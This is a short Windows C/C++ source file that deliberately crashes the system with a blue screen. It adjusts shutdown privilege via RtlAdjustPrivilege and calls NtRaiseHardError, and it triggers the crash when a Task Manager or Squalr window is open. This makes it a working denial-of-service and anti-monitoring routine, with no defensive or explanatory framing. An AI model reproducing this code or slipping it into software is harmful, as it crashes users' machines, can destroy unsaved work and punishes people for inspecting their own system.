#include "bsod_nt.h"
void CallBSOD() {
	BOOLEAN bsod;
	ULONG Response;
	RtlAdjustPrivilege(19, TRUE, FALSE, &bsod); // SeShutdownPrivilege
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); // Shutdown
}
int main() {
	SetConsoleTitle((LPCWSTR)L"BSOD!!!! :(");
	if (FindWindowA(NULL, (LPCSTR)"Task Manager")) {
		Sleep(5000);
		CallBSOD();
	}
	if (FindWindowA(NULL, (LPCSTR)"Squalr")) {
		Sleep(5000);
		CallBSOD();
	}
	Sleep(10000);
	return 0;
}